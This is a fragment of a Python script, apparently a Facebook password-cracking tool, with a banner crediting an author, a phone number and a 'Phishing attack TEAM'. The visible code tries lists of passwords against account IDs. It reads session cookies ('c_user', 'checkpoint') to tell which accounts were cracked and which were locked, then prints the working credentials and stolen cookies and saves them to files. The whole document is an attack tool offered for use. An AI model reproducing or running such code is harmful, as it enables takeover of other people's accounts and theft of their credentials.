...
for xd in range(10000):
    ...
    ugen.append(uaku2)
logo =___       ___      _     ________  ____     __________ 
`MMb     dMM'     dM.    `MMMMMMMb.`MM'     `M`MMMMMMM 
 MMM.   ,PMM     ,MMb     MM    `Mb MM       M MM    \ 
 M`Mb   d'MM     d'YM.    MM     MM MM       M MM      
 M YM. ,P MM    ,P `Mb    MM     MM MM       M MM   ,  
 M `Mb d' MM    d'  YM.   MM    .M9 MM       M MMMMMM  
 M  YM.P  MM   ,P   `Mb   MMMMMMM9' MM       M MM   `  
 M  `Mb'  MM   d'    YM.  MM  \M\   MM       M MM      
 M   YP   MM  ,MMMMMMMMb  MM   \M\  YM       M MM      
 M   `'   MM  d'      YM. MM    \M\  8b     d8 MM      
_M_      _MM_dM_     _dMM_MM_    \M\_ YMMMMM9 _MM_
                                                                                                
╔═════════════════════════════════════════════╗
║  [+] AUTHOR   : MD MARUF KHAN        ║
║  [+] WHATSAPP : +8801308120944              ║
║  [+] TEAM     : �M�BD Phishing attack TEAM�F�   ║
║  [+] CREATOR  : MARUF                     ║
║  [+] VERSION  : 5.0.0                       ║
╚═════════════════════════════════════════════╝""")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[MARUF-OK💛] {uid}|{ps}")
                print(f" \n Cookie : {coki}")
                print(f" \n ══════════════════════════════════════════")
                open('/sdcard/MARUF/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[MARUF-CP🔒] {uid}|{ps}")
                open('/sdcard/MARUF-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[MARUF💉] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
